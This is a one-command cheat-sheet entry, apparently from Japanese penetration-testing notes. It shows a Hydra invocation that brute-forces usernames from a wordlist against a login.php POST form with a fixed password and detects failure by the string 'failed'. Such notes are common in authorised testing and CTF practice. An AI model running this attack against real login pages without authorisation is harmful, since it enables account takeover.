## ## http/https
```sh
# POST Method
## ↓文字一致で判断(ぶぶんい)
hydra -L /opt/wordlists/names.txt -p baconandcheese http-post-form "/login.php:username=^USER^&password=^PASS^:F=failed"
```